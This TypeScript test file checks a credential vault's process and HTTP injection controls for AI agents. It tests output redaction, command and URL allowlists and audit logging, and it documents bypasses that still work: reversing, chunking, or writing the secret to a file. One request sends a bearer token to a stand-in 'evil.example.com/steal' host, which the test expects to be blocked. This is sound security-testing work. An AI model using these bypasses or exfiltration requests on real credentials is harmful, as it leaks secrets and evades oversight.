import { readFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { AuditEventType, ErrorCode } from "@harpoc/shared";
import { DirectClient } from "@harpoc/sdk";
import { createTestVault, destroyTestVault } from "./helpers/engine-factory.js";
import type { TestVault } from "./helpers/engine-factory.js";

/**
 * Process-execution context (thesis §4.5.2, §6.2 sec:attack-output-channel).
 *
 * These tests exercise the process-mediated injector end-to-end and, crucially,
 * characterize the output-channel leakage surface for invariant I2b: for each
 * mitigation the minimum attacker capability at which it is bypassable. Scenarios
 * that pass through a value document a residual bypass; they are evidence for the
 * capability-ladder analysis, not a defect.
 */

const PASSWORD = "integration-test-pw";
const SECRET = "sk-proc-secret-9f8e7d6c5b4a";
const NODE = process.execPath;

function procAction(script: string, extraArgs: string[] = []) {
  return {
    type: "process" as const,
    command: NODE,
    args: ["-e", script, ...extraArgs],
    env_var: "TOKEN",
  };
}

describe("Process execution context (I2b / output-channel leakage)", () => {
  let vault: TestVault;
  let handle: string;

  beforeEach(async () => {
    vault = createTestVault();
    await vault.engine.initVault(PASSWORD);
    const created = await vault.engine.createSecret({
      name: "proc-key",
      type: "api_key",
      value: new Uint8Array(Buffer.from(SECRET, "utf8")),
    });
    handle = created.handle;
    // NODE is a known interpreter — the §4.5.3 gate requires the explicit
    // acknowledgement, making the ladder collapse a recorded policy decision.
    await vault.engine.setInjectionPolicy(
      handle,
      { url_allowlist: [], command_allowlist: [NODE], env_allowlist: [] },
      { acknowledge_interpreters: true },
    );
  });

  afterEach(async () => {
    await destroyTestVault(vault);
  });

  it("injects the credential and returns output (multi-interface: DirectClient)", async () => {
    const client = new DirectClient(vault.engine);
    const res = await client.useSecret(
      handle,
      procAction(`process.stdout.write(process.env.TOKEN ? "SET" : "UNSET")`),
    );
    if (res.type !== "process") throw new Error("expected process result");
    expect(res.exit_code).toBe(0);
    expect(res.stdout).toBe("SET");
  });

  it("I1: the credential never appears in the value returned to the caller", async () => {
    const res = await vault.engine.useSecret(handle, procAction(`process.stdout.write("done")`));
    expect(JSON.stringify(res)).not.toContain(SECRET);
  });

  // --- Output sanitization: what it blocks (raises L1 -> L3) ----------------

  it("L1 blocked: a naive echo of the env var is redacted", async () => {
    const res = await vault.engine.useSecret(
      handle,
      procAction(`process.stdout.write(process.env.TOKEN)`),
    );
    if (res.type !== "process") throw new Error("expected process result");
    expect(res.stdout).not.toContain(SECRET);
    expect(res.stdout).toContain("[REDACTED]");
  });

  it("blocked: a base64 echo of the exact value is redacted", async () => {
    const res = await vault.engine.useSecret(
      handle,
      procAction(`process.stdout.write(Buffer.from(process.env.TOKEN).toString("base64"))`),
    );
    if (res.type !== "process") throw new Error("expected process result");
    expect(res.stdout).not.toContain(Buffer.from(SECRET, "utf8").toString("base64"));
  });

  // --- Output sanitization: documented residual bypasses (>= L3) ------------

  it("L3 residual: an arbitrary transform (reverse) passes through", async () => {
    const res = await vault.engine.useSecret(
      handle,
      procAction(`process.stdout.write([...process.env.TOKEN].reverse().join(""))`),
    );
    if (res.type !== "process") throw new Error("expected process result");
    expect(res.stdout).toBe([...SECRET].reverse().join(""));
  });

  it("L3 residual: character-by-character chunking passes through", async () => {
    const res = await vault.engine.useSecret(
      handle,
      procAction(`process.stdout.write([...process.env.TOKEN].join("."))`),
    );
    if (res.type !== "process") throw new Error("expected process result");
    expect(res.stdout).toContain([...SECRET].join("."));
  });

  it("L3-L4 residual: an indirect file write leaks via the filesystem channel", async () => {
    // Output sanitization covers stdout/stderr only. A spawned process can write
    // the credential to a file the agent later reads. Network isolation (§4.5.3
    // layer 4, network-isolation.test.ts) closes the child's OWN network egress;
    // this file channel remains a documented residual — the reader is the agent,
    // not the child, so no child-side control can close it.
    const leakPath = join(vault.tmpDir, "leak.txt");
    const res = await vault.engine.useSecret(
      handle,
      procAction(
        `import("node:fs").then((fs) => fs.writeFileSync(process.argv[1], process.env.TOKEN))`,
        [leakPath],
      ),
    );
    if (res.type !== "process") throw new Error("expected process result");
    expect(readFileSync(leakPath, "utf8")).toBe(SECRET);
  });

  // --- Command allowlisting (raises L3 -> L4) -------------------------------

  it("L4: command allowlisting denies a non-allowlisted binary", async () => {
    await vault.engine.setInjectionPolicy(handle, {
      url_allowlist: [],
      command_allowlist: ["some-other-binary"],
      env_allowlist: [],
    });
    await expect(
      vault.engine.useSecret(handle, procAction(`process.stdout.write("x")`)),
    ).rejects.toMatchObject({ code: ErrorCode.COMMAND_NOT_ALLOWED });
  });

  it("fail-safe: a secret with no command allowlist cannot be used in a process action", async () => {
    const created = await vault.engine.createSecret({
      name: "no-policy",
      type: "api_key",
      value: new Uint8Array(Buffer.from(SECRET, "utf8")),
    });
    await expect(
      vault.engine.useSecret(created.handle, procAction(`process.stdout.write("x")`)),
    ).rejects.toMatchObject({ code: ErrorCode.COMMAND_NOT_ALLOWED });
  });

  // --- Interpreter acknowledgement (§4.5.3: the L3 -> L4 raise is conditional) ---

  it("§4.5.3: refuses to allowlist an interpreter without acknowledgement and audits the refusal", async () => {
    const created = await vault.engine.createSecret({
      name: "interp-gate",
      type: "api_key",
      value: new Uint8Array(Buffer.from(SECRET, "utf8")),
    });
    await expect(
      vault.engine.setInjectionPolicy(created.handle, {
        url_allowlist: [],
        command_allowlist: [NODE],
        env_allowlist: [],
      }),
    ).rejects.toMatchObject({ code: ErrorCode.INTERPRETER_NOT_ACKNOWLEDGED });

    // The allowlist stays empty, so the fail-safe deny still holds
    await expect(
      vault.engine.useSecret(created.handle, procAction(`process.stdout.write("x")`)),
    ).rejects.toMatchObject({ code: ErrorCode.COMMAND_NOT_ALLOWED });

    const refused = vault.engine.queryAudit({
      eventType: AuditEventType.POLICY_INTERPRETER_REFUSED,
    });
    expect(refused).toHaveLength(1);
    expect(refused[0]?.detail?.interpreters).toEqual([NODE]);
  });

  it("§4.5.3: the acknowledged interpreter addition is recorded in the audit trail", async () => {
    // beforeEach acknowledged NODE for `handle`
    const acked = vault.engine.queryAudit({
      eventType: AuditEventType.POLICY_INTERPRETER_ACKNOWLEDGED,
    });
    expect(acked).toHaveLength(1);
    expect(acked[0]?.detail?.interpreters).toEqual([NODE]);
  });

  it("clean environment: the child does not inherit the vault's process env", async () => {
    process.env.HARPOC_INTEG_MARKER = "LEAKED";
    try {
      const res = await vault.engine.useSecret(
        handle,
        procAction(`process.stdout.write(process.env.HARPOC_INTEG_MARKER ? "PRESENT" : "ABSENT")`),
      );
      if (res.type !== "process") throw new Error("expected process result");
      expect(res.stdout).toBe("ABSENT");
    } finally {
      Reflect.deleteProperty(process.env, "HARPOC_INTEG_MARKER");
    }
  });

  // --- URL allowlisting for the request-mediated path ----------------------

  it("URL allowlisting blocks a request-mediated injection to a non-allowlisted host", async () => {
    await vault.engine.setInjectionPolicy(handle, {
      url_allowlist: ["https://api.github.com/*"],
      command_allowlist: [],
      env_allowlist: [],
    });
    await expect(
      vault.engine.useSecret(handle, {
        type: "http",
        method: "GET",
        url: "https://evil.example.com/steal",
        injection: { type: "bearer" },
      }),
    ).rejects.toMatchObject({ code: ErrorCode.URL_NOT_ALLOWED });
  });
});
